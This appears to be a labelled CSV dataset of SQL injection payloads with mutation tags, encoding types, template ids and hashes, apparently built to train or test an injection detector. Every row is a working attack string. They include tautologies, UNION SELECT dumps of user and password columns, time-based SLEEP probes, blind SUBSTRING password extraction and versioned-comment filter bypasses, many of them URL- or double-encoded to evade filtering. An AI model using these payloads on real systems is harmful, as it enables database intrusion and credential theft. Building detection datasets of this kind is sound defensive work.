"cat=electronics%27+UNION+SELECT+1,2%23%2F*",1,sqli_param_var,comment_block_comment|ws_mixed_ws,partially_encoded,SQLI_PARAM_VAR_003,8751d1ba9a65e4922c991d10b84c61f0,7a9e0af14e51aa9b2b23e4f5248d8644,42
query=book' and SLEEP(5)#,1,sqli_param_var,case_var|comment_hash,raw,SQLI_PARAM_VAR_004,693562888a50618931553c8605826f08,385290c3b505b7507354ecdb468dcec6,25
filter=active' AND 'a'='a--,1,sqli_param_var,comment_dash_dash,raw,SQLI_PARAM_VAR_005,4e3be6664e22adefa2702516647c7251,d8da7e75fd105f43b947ddfbe319067d,27
query=book'   AND   SLEEP(5)#%23,1,sqli_param_var,case_var|comment_url_hash|ws_mixed_ws,raw,SQLI_PARAM_VAR_004,40d6fd26949516863a31d9ccca091dfc,98db905dcb50c2680746f99082e49d73,32
search=1' or 1=1#;-- -,1,sqli_param_var,case_var|comment_semicolon_comment,raw,SQLI_PARAM_VAR_001,8dd55119394c56a9933f211065c1a8d9,136688fc9016c74203189921fb1537fb,22
"cat=electronics' UNION seLeCt 1,2#;-- -",1,sqli_param_var,case_var|comment_semicolon_comment|ws_space,raw,SQLI_PARAM_VAR_003,5d4acaada8bc9018f4066b42873b1c44,01e65582f13c9ae780318e93f27a36cf,39
filter%253Dactive%2527%2BAnd%2B%2527a%2527%253D%2527a%253B--%2B-,1,sqli_param_var,case_var|comment_semicolon_comment,double_encoded,SQLI_PARAM_VAR_005,4b945a5c39d7ddc63b14597bb3574a69,efb41dda5e9fdb6d62c5a8be8bd70e29,64
search%3D1'%20OR%201=1%23,1,sqli_param_var,case_var|ws_url_space,partially_encoded,SQLI_PARAM_VAR_001,9c019b7592d65dad6fc0f75f13979825,0950c90971e0534faa9f42c7324425f6,25
filter%253Dactive%2527%2B%2BAnd%2B%2B%2527a%2527%253D%2527a,1,sqli_param_var,case_var|ws_multi_space,double_encoded,SQLI_PARAM_VAR_005,b6a3085b76e7444b37be2053c9a93e3f,6ec0660ea2672c8d9f2eea493541add0,59
page%3D1%27+AND+1%3D1%23%26sort%3Dasc,1,sqli_param_var,standard,url_encoded,SQLI_PARAM_VAR_002,1b3037968819c4481d3b1b49df0030cf,d741e5260a76e88ced8fa4c5b7335891,37
query%3Dbook%27%2Band%2BSLEEP%285%29%23,1,sqli_param_var,case_var|ws_mixed_ws,url_encoded,SQLI_PARAM_VAR_004,d7cdcdafcc2c19e60b9bb4bf0dec4492,8e9bfcf7d854979d9fca7deb1b9c33ff,39
filter=active'%20And%20'a'='a;--%20-,1,sqli_param_var,case_var|comment_semicolon_comment|ws_url_space,raw,SQLI_PARAM_VAR_005,913b7cf81ed3741c9f5182b539f04030,5988774530595f8fd86a85f6e070bee6,36
search%3D1%27++OR++1%3D1%23,1,sqli_param_var,ws_multi_space,url_encoded,SQLI_PARAM_VAR_001,01d01c8119ee42b863983b1784fed491,d5627f2b1b5706e30e568a09b8fedfc1,27
query%253Dbook%2527%2509AND%2509SLEEP%25285%2529%2523%252F%252A,1,sqli_param_var,comment_block_comment|ws_tab,double_encoded,SQLI_PARAM_VAR_004,24c0abe7c7b1bdef97851067f4bc0baa,dd01f7c74717b90e2d96c1943852373f,63
page%3D1%27%20AND%201=1#&sort%3Dasc,1,sqli_param_var,ws_mixed_ws,partially_encoded,SQLI_PARAM_VAR_002,75906884d08471e67723a20ecf9dbec0,14016e1e08ae098d4731a5c7e7f55b19,35
filter%253Dactive%2527%2Band%2B%2527a%2527%253D%2527a,1,sqli_param_var,case_var,double_encoded,SQLI_PARAM_VAR_005,033cef168d8a58094a7cae02ff764729,d2b9cd09599fa3524458917810e5e10b,53
filter%3Dactive'%20aNd%20%27a%27%3D%27a,1,sqli_param_var,case_var|ws_url_space,partially_encoded,SQLI_PARAM_VAR_005,1fc7cce284167d1190723813b8065c3f,9e6f65d8feaa682ca25d9f624921025e,39
query=book%27 AND SLEEP(5)%23%23,1,sqli_param_var,case_var|comment_url_hash,partially_encoded,SQLI_PARAM_VAR_004,2a4a67162e68974040d5c92f5eceddd2,3328cdfcf70a467a13b080c40bb78267,32
cat%3Delectronics%27+Union+Select+1%2C2%23--,1,sqli_param_var,case_var|comment_dash_dash,url_encoded,SQLI_PARAM_VAR_003,4cfa9eeb76167501f603913db0f3e47f,6988cb33d3fd543584f71e9ef86416b9,44
query%253Dbook%2527%2BAND%2BSLEEP%25285%2529%2523--,1,sqli_param_var,case_var|comment_dash_dash,double_encoded,SQLI_PARAM_VAR_004,f8bf1a1df17cec8e6f2b896e85020870,218a9f3ded08c1799e27ae6a63ac472b,51
query%3Dbook'+AND SLEEP(5)%23,1,sqli_param_var,case_var,partially_encoded,SQLI_PARAM_VAR_004,a5bb8b31f21403d4e65ac3b999ca3fc9,54d0d9eaaf50ceba5f898150eccca969,29
page=1%27/%2A%2A/AND%2F*%2A/1%3D1%23&sort%3Dasc%23,1,sqli_param_var,comment_url_hash|ws_mixed_ws,partially_encoded,SQLI_PARAM_VAR_002,6292334d8fef8ab1f4dc9a228efd8c93,0456b2c46de914731c89e3c2892dd20b,50
page%253D1%2527%252520AND%2525201%253D1%2523%2526sort%253Dasc,1,sqli_param_var,ws_url_space,double_encoded,SQLI_PARAM_VAR_002,58552e35c71095e7c63ee0c96939d8b3,6a80f4e417f7a2df1541e9f3fe991b58,61
page%3D1%27%09AND%091%3D1%23%26sort%3Dasc,1,sqli_param_var,ws_tab,url_encoded,SQLI_PARAM_VAR_002,ecf1481d0e067c7d1fe73e1ab7c33e6b,4f18b6953a227a7b00b92e398c333739,41
filter%253Dactive%2527%2BAND%2B%2527a%2527%253D%2527a%2523,1,sqli_param_var,comment_hash,double_encoded,SQLI_PARAM_VAR_005,d1524a95b821db35bc13b7022f3b312e,099485312efaab37845eae7c13759e4f,58
page=1%27 AND+1=1#&sort%3Dasc,1,sqli_param_var,case_var,partially_encoded,SQLI_PARAM_VAR_002,0ed5f629681cd4b58945b693a8991d9f,04c8213e50546cb4e397e329fd0376a2,29
page=1'+AND+1=1#&sort=asc,1,sqli_param_var,case_var|ws_plus,raw,SQLI_PARAM_VAR_002,7c6df32bd5273b6990d4d0ae915ea507,7fefcac4e55bbb6a91fc235641fe7fa0,25
filter%3Dactive%27%2BAND%2B%27a%27%3D%27a%2F%2A,1,sqli_param_var,comment_block_comment|ws_mixed_ws,url_encoded,SQLI_PARAM_VAR_005,a4d1e764bce04531670554fd8ab48bfd,816bf6e78e3415a159a9e68052acac61,47
filter%3Dactive%27%2BAND%2B%27a%27%3D%27a,1,sqli_param_var,ws_plus,url_encoded,SQLI_PARAM_VAR_005,5c25910cf4ff398656714a029005e69c,87c7e9f61b8c922c3022dc7d9113df83,41
query%3Dbook%27+And+SLEEP%285%29%23%3B--+-,1,sqli_param_var,case_var|comment_semicolon_comment,url_encoded,SQLI_PARAM_VAR_004,1929594d2cb359f25aed7999fd5e59e4,4d6863d3fc28ed7a9b2740607c2df755,42
search%3D1%27+OR+1%3D1#,1,sqli_param_var,case_var|ws_plus,partially_encoded,SQLI_PARAM_VAR_001,d1e3a809c45133296a0d6077e061a13a,176a20351b58d74d9d782a1835430e10,23
search=1'+Or+1=1#,1,sqli_param_var,case_var,partially_encoded,SQLI_PARAM_VAR_001,f3aaa6302c59156f6b272d5012344962,0aa71c300aa44449d84d4db886731e6c,17
query%3Dbook'%2F*%2A%2FAND/%2A%2A%2FSLEEP(5)%23--,1,sqli_param_var,comment_dash_dash|ws_comment_ws,partially_encoded,SQLI_PARAM_VAR_004,38df0b46b7b2459a0a8f6cbe12cb1a9c,1e59f44589983ea2f127d0d39e3cf281,49
"cat%3Delectronics'/**/UNION%2F*%2A%2FSELECT%2F*%2A/1,2%23--",1,sqli_param_var,case_var|comment_dash_dash|ws_comment_ws,partially_encoded,SQLI_PARAM_VAR_003,2b7d42ffdfe2d33a6b8b3394355ecf40,2ee3c88289f2ed8dac87ce9137fec4d5,59
page%3D1'+AND 1%3D1%23&sort%3Dasc#,1,sqli_param_var,comment_hash,partially_encoded,SQLI_PARAM_VAR_002,9a93d27a0b451fcf2018531bdae2a666,3e6d106b1f963af04f5aa3eec44c91d8,34
"cat%3Delectronics'+union+SeLeCt 1,2#--+-",1,sqli_param_var,case_var|comment_dash_dash_space,partially_encoded,SQLI_PARAM_VAR_003,b8d9000cd7ccc48e4b257b843172facb,62363ea1e5cb405580b4a6ba71154462,40
"cat%3Delectronics%27	UNION	SELECT	1,2%23",1,sqli_param_var,ws_tab,partially_encoded,SQLI_PARAM_VAR_003,e03033884d0a655a5c7a79f070e159ca,63932c3bc2d8fcaf73c4b53be577ae13,40
filter=active'%20AND%20%27a%27=%27a%23,1,sqli_param_var,comment_url_hash|ws_url_space,partially_encoded,SQLI_PARAM_VAR_005,c4039af6c80f8397f3e129f37b27e9b4,b5f355d389f8fdfb84f1cc28be296b6a,38
query%3Dbook%27%2BanD%2BSLEEP%285%29%23--,1,sqli_param_var,case_var|comment_dash_dash|ws_mixed_ws,url_encoded,SQLI_PARAM_VAR_004,a569870b04949cbbba94dfe868deec6e,9b5d0f09780d49e79a631c73bcad033d,41
query%3Dbook'+and+SLEEP(5)%23--+-,1,sqli_param_var,case_var|comment_dash_dash_space,partially_encoded,SQLI_PARAM_VAR_004,88a47bc8b96644a1af6a4358bd23f6c4,71ad7a5708139b0d995c1dd9f238fc1b,33
query%3Dbook%27%2F%2A%2A/AND%2F%2A%2A%2FSLEEP(5)%23--,1,sqli_param_var,comment_dash_dash|ws_comment_ws,partially_encoded,SQLI_PARAM_VAR_004,f660a7a7a73009e077a5f0e3551e3396,0cc2c7156c9dac319a0b3254cf4d5de0,53
page=1'+AND 1=1%23&sort=asc,1,sqli_param_var,case_var,partially_encoded,SQLI_PARAM_VAR_002,50c659f9e9a26e460f94572826557411,0aa7e7aeb3aca0525496bc6aadc4689f,27
"cat=electronics%27+UNION+SELECT+1,2#",1,sqli_param_var,ws_plus,partially_encoded,SQLI_PARAM_VAR_003,080ddac6eda98e1433684d8e25a0b62d,6be26606c254c24c39ca5796c356d7e6,36
query=book%27 AND+SLEEP(5)%23,1,sqli_param_var,standard,partially_encoded,SQLI_PARAM_VAR_004,f74a82b9a2185d9659890cc37ef690da,5a92487295c60b9b52669b66cf34e73f,29
filter%253Dactive%2527%2509AND%2509%2527a%2527%253D%2527a,1,sqli_param_var,case_var|ws_tab,double_encoded,SQLI_PARAM_VAR_005,c1b65b26cd299dc0edbb855f3ab20439,f2c8fbb6fd3ef03e6429ee996a74308c,57
search%3D1'+OR+1=1%23,1,sqli_param_var,ws_plus,partially_encoded,SQLI_PARAM_VAR_001,59ae3e39a31444b1fb5cb3b8c0f305e0,b143b47398ba8323800f10758f3e1b67,21
"id=-1%27/*!50000UNION*%2F/%2A!50000SELECT%2A/1,CONCAT(user,0x3a,password)+From+users--",1,sqli_mixed,case_var,partially_encoded,SQLI_MIXED_003,20f311747e2a5b5be5635197fc4b4d62,165733354b271b246bf310d92111834b,86
id%253D-1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252CCONCAT%2528user%252C0x3a%252Cpassword%2529%2B%2Bfrom%2B%2Busers----%2B%2B-,1,sqli_mixed,case_var|comment_dash_dash_space|ws_multi_space,double_encoded,SQLI_MIXED_003,227a6b0ae2dc87b33b88be768655893b,30910898d84c72e2ded8780119386e6b,165
"username=admin'/*foo*/AND/*bar*/SUBSTRING((SELECT/**/password/**/FROM/**/users),1,1)='a'#;--/**/-",1,sqli_mixed,comment_semicolon_comment|ws_comment_ws,raw,SQLI_MIXED_002,def1c6e05eb2bd55092dcd78050a209b,08d8e928027b150cada1e9464237390f,97
id%253D-1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252CCONCAT%2528user%252C0x3a%252Cpassword%2529%252520FROM%252520users----%252520-,1,sqli_mixed,comment_dash_dash_space|ws_url_space,double_encoded,SQLI_MIXED_003,e49c1c3fa837daeaaed28816d8521693,5ff0918c587d6e32596fa54b8c4da885,168
id%253D1%252527%25252F%25252A%25252A%25252F%25256f%252552%252520%252531%25253d%252531%252523--%2509-,1,sqli_mixed,comment_dash_dash_space|ws_tab,double_encoded,SQLI_MIXED_001,266122c2a0f08842660363287e1505cd,ae76d6d0349b348d275a4eb2e44e8541,100
id%3D1%27%2F%2A%2A%2F%6f%52%20%31%3d%31%23,1,sqli_mixed,case_var,partially_encoded,SQLI_MIXED_001,153e497a59684dda3981f150635eefbb,68f6417f4a7091301f36a871cbcedd83,42
"username=admin'/*foo*/AND/*bar*/SUBSTRING((SELECT%20password%20FROM%20users),1,1)='a'#--",1,sqli_mixed,case_var|comment_dash_dash|ws_url_space,raw,SQLI_MIXED_002,9d9c5f909e5b1866b4190ad60f71943e,adea7e062c961be9140d43be28f06998,88
"id=-1%27%2F%2A!50000UNION%2A%2F/%2A!50000SELECT%2A/1,CONCAT(user,0x3a,password)+frOM users--%2F%2A",1,sqli_mixed,case_var|comment_block_comment,partially_encoded,SQLI_MIXED_003,97bb7235927674a31a6fab2fb507e83f,8810ccf33a7b67e370cfe01aef89c067,98
id=1%27%2F%2A%2A%2F%6f%52%20%31%3d%31%23,1,sqli_mixed,ws_mixed_ws,partially_encoded,SQLI_MIXED_001,d8cec07cdd18fcdb00a5f52f00525db8,399b9b6af6438ca7aa2701470af88398,40
id%3D1%2527%252F%252A%252A%252F%256f%2552%2520%2531%253d%2531%2523%3B--+-,1,sqli_mixed,case_var|comment_semicolon_comment,url_encoded,SQLI_MIXED_001,1a8f4b47e588d4227027d9279d319cbb,815813baeb1633b7b1a1f7f8ac6ccb9b,73
id%253D-1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252CCONCAT%2528user%252C0x3a%252Cpassword%2529%2Bfrom%2Busers--%252F%252A,1,sqli_mixed,case_var|comment_block_comment|ws_space,double_encoded,SQLI_MIXED_003,749a09d02add9e9bf5ae172b8e548a55,dcc79f7b46fd320a493b71b40227c209,160
"username=admin'/*foo*/AND/*bar*/SUBSTRING((SELECT%20password%20From%20users),1,1)='a'#/*",1,sqli_mixed,case_var|comment_block_comment|ws_mixed_ws,raw,SQLI_MIXED_002,c742db632d70b137288e9f6b7ddcac71,3e8e781b7aa261edda699c5c7f05df58,88
"id=-1%27/%2A!50000UNION%2A%2F%2F%2A!50000SELECT%2A/1,CONCAT(user,0x3a,password)+FROM+users--/%2A",1,sqli_mixed,comment_block_comment,partially_encoded,SQLI_MIXED_003,42c849b359ffd1182c70c47117aab0f6,ad226fa9b9600d052165d238a6ec7560,96
id%253D-1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252CCONCAT%2528user%252C0x3a%252Cpassword%2529%2BFROM%2Busers--,1,sqli_mixed,comment_dash_dash|ws_space,double_encoded,SQLI_MIXED_003,c10290626132ce15e618d33eb26cf2ae,01c464e18802bae93b00b91870af7aac,150
"username%3Dadmin'/*foo*%2FAND%2F%2Abar%2A/SUBSTRING((SELECT+password FROM users),1,1)%3D'a%27#",1,sqli_mixed,standard,partially_encoded,SQLI_MIXED_002,fbefaf4f765a69f5c3b4742bcb3d103e,a1e05b9aae02d5d6c480c368329a3181,94
id%3D1%27%2F%2A%2A%2F%6f%52%20%31%3d%31%23--,1,sqli_mixed,comment_dash_dash,partially_encoded,SQLI_MIXED_001,cb814bc5e339fefa41d04c55b95c8330,4e9fac96120d27e7c26c4aaad614d73b,44
id%3D-1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2CCONCAT%28user%2C0x3a%2Cpassword%29+from+users--%3B--+-,1,sqli_mixed,case_var|comment_semicolon_comment,url_encoded,SQLI_MIXED_003,e9bc4eaef21bee111b09200741790bfc,9eaff75d8838e4423c9ca7ae7eafaa52,119
"id%3D-1%27%2F*!50000UNION*%2F%2F*!50000SELECT*%2F1,CONCAT(user,0x3a,password)	FROM	users--%23",1,sqli_mixed,case_var|comment_url_hash|ws_tab,partially_encoded,SQLI_MIXED_003,22d786f6d121d3073290d7e08bd5de58,44761bbd86e3433bad0353adf003dab2,93
username%253Dadmin%2527%252F%252Afoo%252A%252FAND%252F%252Abar%252A%252FSUBSTRING%2528%2528SELECT%2509password%2509FROM%2509users%2529%252C1%252C1%2529%253D%2527a%2527%2523--,1,sqli_mixed,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_MIXED_002,b49a02ce99701e7cf89403c8224b9815,c476d21411c9bacd456748630728f768,174
id%3D1%27%2F%2A%2A%2F%6f%52%20%31%3d%31%23-- +-,1,sqli_mixed,case_var|comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_MIXED_001,e06e252dc763c788aa49f28e3ed3d021,9a35f09147b9421708c6541d8c2c3da1,47
id=1%27%2F%2A%2A%2F%6f%52%20%31%3d%31%23#,1,sqli_mixed,comment_hash|ws_mixed_ws,raw,SQLI_MIXED_001,dfb95b1bd12d8ce6a3a4378f0f4bdd23,dfce4752f2f4cc6207853a8d52d06210,41
"username%3Dadmin%27/%2Afoo%2A%2FAND%2F%2Abar%2A/SUBSTRING((SELECT+password+FROM users),1,1)%3D%27a'%23",1,sqli_mixed,standard,partially_encoded,SQLI_MIXED_002,57166c2b88a58cff3dae75b54644477d,ca7b453b46c857710e7b79ef366f236a,102
id%3D-1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2CCONCAT%28user%2C0x3a%2Cpassword%29+from+users--,1,sqli_mixed,case_var,url_encoded,SQLI_MIXED_003,166cc395ade6f0bca874cec6faec4197,dff60317bf2a056dad458f41b0c51a64,112
"id=-1'/*!50000UNION*//*!50000SELECT*/1,CONCAT(user,0x3a,password)+FROM+users--",1,sqli_mixed,ws_plus,raw,SQLI_MIXED_003,ed0422b722e33beb6c077b007e24fc00,42d163af2f17556c1e00c70cbd3abec9,78
username%3Dadmin%27%2F%2Afoo%2A%2FAND%2F%2Abar%2A%2FSUBSTRING%28%28SELECT%2520password%2520FROM%2520users%29%2C1%2C1%29%3D%27a%27%23%2523,1,sqli_mixed,case_var|comment_url_hash|ws_url_space,url_encoded,SQLI_MIXED_002,92f2a92dbcc29afa6f3cc02ac0e5b9a9,9ecc258727788a74384c4f6b5c665b13,137
"username%3Dadmin'/*foo*%2FAND/%2Abar%2A/SUBSTRING((SELECT+password fRom+users),1,1)=%27a%27%23-- -",1,sqli_mixed,case_var|comment_dash_dash_space|ws_space,partially_encoded,SQLI_MIXED_002,1817c6934a7480fff8d76cccbd246b1c,d38f2f07a769940457cc545b14a7e943,98
id%253D1%252527%25252F%25252A%25252A%25252F%25256f%252552%252520%252531%25253d%252531%252523,1,sqli_mixed,case_var|comment_url_hash|ws_multi_space,double_encoded,SQLI_MIXED_001,e8bdcffac69eb55899bca2ebf3000f3c,555f614f6b472e1a85047220a408b104,92
id%3D1%27%2F%2A%2A%2F%6f%52%20%31%3d%31%23/%2A,1,sqli_mixed,comment_block_comment,partially_encoded,SQLI_MIXED_001,20a4616e865ae45468b67fcee65003bb,a77291fecae3136b6c2aac7ec84aa412,46
id%3D1%2527%252F%252A%252A%252F%256f%2552%2520%2531%253d%2531%2523--,1,sqli_mixed,case_var|comment_dash_dash,url_encoded,SQLI_MIXED_001,ca1f4a2a4f19f8073369f19b6252a678,b0d0c494ff834a6f3b0f7fe499688c62,68
"id=-1'/*!50000UNION*//*!50000SELECT*/1,CONCAT(user,0x3a,password) from users--",1,sqli_mixed,case_var,raw,SQLI_MIXED_003,dcc78321a45d1800ce6258e10cfac7b3,7a84800f16f7eb9718e2b92c5ff1505f,78
id%253D-1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252CCONCAT%2528user%252C0x3a%252Cpassword%2529%252F%252A%252A%252FFROM%252F%252A%252A%252Fusers--%252F%252A,1,sqli_mixed,case_var|comment_block_comment|ws_comment_ws,double_encoded,SQLI_MIXED_003,cb448ccb0986f48ce810a6b3a142d203,b1aeb377ca339d8a18568cc37ad88f8d,194
id%253D-1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252CCONCAT%2528user%252C0x3a%252Cpassword%2529%2BFROM%2Busers----%2B-,1,sqli_mixed,comment_dash_dash_space|ws_space,double_encoded,SQLI_MIXED_003,e2ad5b8a00c223bf3cb8eefa0c95b54a,e2a894a90cb98ecb63bab522ee2924e4,156
"username=admin'/*foo*/AND/*bar*/SUBSTRING((SELECT+password+FROM+users),1,1)='a'#--+-",1,sqli_mixed,comment_dash_dash_space|ws_plus,raw,SQLI_MIXED_002,c9cf3b5ae3305b3c2b6568175aa6f688,f2e9487494dec7d8704251684279f24d,84
"username=admin'/*foo*/AND/*bar*/SUBSTRING((SELECT  password  FROM  users),1,1)='a'#",1,sqli_mixed,ws_multi_space,raw,SQLI_MIXED_002,5a46a1f7408d21720835fce128aa78db,3e62b88429cad5031c7179298d9ed72d,83
"id%3D-1%27/*!50000UNION%2A%2F%2F%2A!50000SELECT*%2F1,CONCAT(user,0x3a,password)+From+users--",1,sqli_mixed,case_var|ws_plus,partially_encoded,SQLI_MIXED_003,54bac03b08e9019b8b76b3b8ff2d994c,742df2ab9ee911717e2eb812d99625ed,92
id%253D-1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252CCONCAT%2528user%252C0x3a%252Cpassword%2529%2Bfrom%2Busers--%2523,1,sqli_mixed,case_var|comment_hash,double_encoded,SQLI_MIXED_003,8682ae5e671fa9bf312bb0fe313bbc15,06bdc980b29e53732fdcd1a502e76516,155
id%253D1%252527%25252F%25252A%25252A%25252F%25256f%252552%252520%252531%25253d%252531%252523%2523,1,sqli_mixed,case_var|comment_hash,double_encoded,SQLI_MIXED_001,840f6ab402c227dfc93a9915805e2cc2,2bd313201796fb059c0cf3e9cf7efb7b,97
"username=admin'/*foo*/AND/*bar*/SUBSTRING((SELECT password From users),1,1)='a'#;-- -",1,sqli_mixed,case_var|comment_semicolon_comment,raw,SQLI_MIXED_002,4dcf1bac0b9074d5e69b2ad68706ee79,e49c9cbe9ef3f532a9a296195b85eb42,85
username%3Dadmin%27%2F%2Afoo%2A%2FAND%2F%2Abar%2A%2FSUBSTRING%28%28SELECT%2F%2A%2A%2Fpassword%2F%2A%2A%2FFrom%2F%2A%2A%2Fusers%29%2C1%2C1%29%3D%27a%27%23%3B--%2F%2A%2A%2F-,1,sqli_mixed,case_var|comment_semicolon_comment|ws_mixed_ws,url_encoded,SQLI_MIXED_002,3f82616c270edddce4fb32c866654ccc,e174607de26f402056e908feaba3cca3,171
username%3Dadmin%27%2F%2Afoo%2A%2FAND%2F%2Abar%2A%2FSUBSTRING%28%28SELECT+++password+++FROM+++users%29%2C1%2C1%29%3D%27a%27%23--+++-,1,sqli_mixed,comment_dash_dash_space|ws_mixed_ws,url_encoded,SQLI_MIXED_002,1c0309bae0ad7ca2b58ca33b30ccab54,7a6e6bc560d08e7e4411f8494a9374f3,132
username%253Dadmin%2527%252F%252Afoo%252A%252FAND%252F%252Abar%252A%252FSUBSTRING%2528%2528SELECT%2Bpassword%2BFROM%2Busers%2529%252C1%252C1%2529%253D%2527a%2527%2523%253B--%2B-,1,sqli_mixed,comment_semicolon_comment,double_encoded,SQLI_MIXED_002,127a844478ce754c087f08be7c542ec8,aba1a389eaa6e592dc1401924248028d,177
"id=-1'/*!50000UNION*//*!50000SELECT*/1,CONCAT(user,0x3a,password) FROM users--;-- -",1,sqli_mixed,comment_semicolon_comment,raw,SQLI_MIXED_003,78c518afc40dcd902c2420fc81662d1d,5baf16c8de7ddbd35bda7c2f71bb37b6,83
"id%3D-1'%2F%2A!50000UNION*/%2F%2A!50000SELECT*%2F1,CONCAT(user,0x3a,password)	FROM	users--%23",1,sqli_mixed,comment_url_hash|ws_tab,partially_encoded,SQLI_MIXED_003,1e3e9e108932e0006ed24401224932b2,fea751f1bd0effa5535f7a451a5e83f4,93
"username=admin'/*foo*/AND/*bar*/SUBSTRING((SELECT%20password%20from%20users),1,1)='a'#--%20-",1,sqli_mixed,case_var|comment_dash_dash_space|ws_url_space,raw,SQLI_MIXED_002,1f8cde5243b261549e7acd972f2d7051,a35b961d357c87787bbd977f72e07e07,92
id%253D-1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252CCONCAT%2528user%252C0x3a%252Cpassword%2529%252Bfrom%252Busers--%253B--%252B-,1,sqli_mixed,case_var|comment_semicolon_comment|ws_plus,double_encoded,SQLI_MIXED_003,336d1a23f43148e2461bd3e915cfa0eb,7063b0e15ad4b60cb61094efc4a47671,167
"username%3Dadmin'/*foo%2A%2FAND/%2Abar*/SUBSTRING((SELECT+password FROM+users),1,1)%3D%27a%27%23",1,sqli_mixed,standard,partially_encoded,SQLI_MIXED_002,6b24afbb0dedf324cd7fbbd56d520f9b,b01d3c5d9cf8aa8fac7abe80b99ae12d,96
"username=admin%27%2F%2Afoo*/AND/*bar%2A%2FSUBSTRING((SELECT%20password%20FROM%20users),1,1)%3D%27a%27%23--%20-",1,sqli_mixed,comment_dash_dash_space|ws_url_space,partially_encoded,SQLI_MIXED_002,b3aca24e2a04554f6e755cd44500480d,1b0cf241c35e838b02cb4b9e3b74e4d6,110
"id=-1'/*!50000UNION*//*!50000SELECT*/1,CONCAT(user,0x3a,password) FROM users---- -",1,sqli_mixed,case_var|comment_dash_dash_space,raw,SQLI_MIXED_003,29a476ac8f89b4e2cf2bddaf7599b0b4,e4d4d1e417fb55c7598612c94f54bd6d,82
username%253Dadmin%2527%252F%252Afoo%252A%252FAND%252F%252Abar%252A%252FSUBSTRING%2528%2528SELECT%252520password%252520frOm%252520users%2529%252C1%252C1%2529%253D%2527a%2527%2523,1,sqli_mixed,case_var|ws_url_space,double_encoded,SQLI_MIXED_002,851d7965fba0a3688fb013bddd5bac5f,298b7ef6b40ed587c9f63b35519ca8b5,178
username%253Dadmin%2527%252F%252Afoo%252A%252FAND%252F%252Abar%252A%252FSUBSTRING%2528%2528SELECT%2Bpassword%2BFROM%2Busers%2529%252C1%252C1%2529%253D%2527a%2527%2523%252F%252A,1,sqli_mixed,comment_block_comment,double_encoded,SQLI_MIXED_002,ed002095e26b1c909e57d04ee322bff1,63665e594d9bf4e96d92d3b32f7716ef,176
"username=admin'/*foo*/AND/*bar*/SUBSTRING((SELECT password From users),1,1)='a'#-- -",1,sqli_mixed,case_var|comment_dash_dash_space|ws_space,raw,SQLI_MIXED_002,8e2ae907491fdba7b31bfce3fac49772,2c7670a63ea122e3997b46c4066042b5,84
id%3D-1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2CCONCAT%28user%2C0x3a%2Cpassword%29+FROM+users--%2F%2A,1,sqli_mixed,comment_block_comment,url_encoded,SQLI_MIXED_003,cba3274e45449a2c30d19bd79b806c38,29195adcd765602af43e9cad847d38c1,118
id%3D-1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2CCONCAT%28user%2C0x3a%2Cpassword%29%2BFROM%2Busers--,1,sqli_mixed,ws_plus,url_encoded,SQLI_MIXED_003,665172d7bf8aed60dbf25af70ec0d366,dc8b7e6e6918c08c92226bb41e987e98,116
id%3D1%2527%252F%252A%252A%252F%256f%2552%2520%2531%253d%2531%2523,1,sqli_mixed,case_var|ws_multi_space,url_encoded,SQLI_MIXED_001,705bc42124255d5ba7e8bb12c4ef77c6,ffa6823f44cab500376453d066e92ba0,66
"id%3D-1'%2F%2A!50000UNION*%2F/*!50000SELECT*%2F1,CONCAT(user,0x3a,password) FROM+users--",1,sqli_mixed,standard,partially_encoded,SQLI_MIXED_003,6381e416a380200ba8b14b033f46cf1c,fbe32b09c02505f7b7f766e54c1b38b1,88
username%253Dadmin%2527%252F%252Afoo%252A%252FAND%252F%252Abar%252A%252FSUBSTRING%2528%2528SELECT%2Bpassword%2Bfrom%2Busers%2529%252C1%252C1%2529%253D%2527a%2527%2523,1,sqli_mixed,case_var,double_encoded,SQLI_MIXED_002,6ffd28c9a55e5fc917bec40ec07521c5,c293b533b0d06c50837da7ce12ecb58f,166
"id=-1'/*!50000UNION*//*!50000SELECT*/1,CONCAT(user,0x3a,password)%20FROM%20users--",1,sqli_mixed,ws_url_space,raw,SQLI_MIXED_003,7d0ae6a474ba14aa7da94606d65111ed,27039e7bd8fd0b3062cc8a0715cbae8e,82
id%3D-1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2CCONCAT%28user%2C0x3a%2Cpassword%29%2BFROM%2Busers--%2F%2A,1,sqli_mixed,comment_block_comment|ws_plus,url_encoded,SQLI_MIXED_003,d1a56e9a617d3616b7847103f64cab71,f9f7150ed0e959fcf0b670938414a41a,122
"id=-1'%2F%2A!50000UNION%2A%2F/*!50000SELECT%2A%2F1,CONCAT(user,0x3a,password)  From  users--",1,sqli_mixed,case_var|ws_multi_space,partially_encoded,SQLI_MIXED_003,713bc0733b11993a0338b6244dc5ab83,e0d52e59d2bf712e8c59c367245135e1,92
"id%3D-1'%2F%2A!50000UNION*/%2F*!50000SELECT*%2F1,CONCAT(user,0x3a,password)%20FROM%20users--%23",1,sqli_mixed,comment_url_hash|ws_url_space,partially_encoded,SQLI_MIXED_003,9bf8a455bda2e2c0511d55bc22d0739d,29da3d33dbcd9aecfd263c282034bf81,95
id%3D-1%27%2F%2A%2150000UNION%2A%2F%2F%2A%2150000SELECT%2A%2F1%2CCONCAT%28user%2C0x3a%2Cpassword%29%2BFROM%2Busers----%2B-,1,sqli_mixed,comment_dash_dash_space|ws_mixed_ws,url_encoded,SQLI_MIXED_003,315f5e50b57dd296ba5c8561cda2972b,f0b491ef5414aa0ecaf066987308e303,122
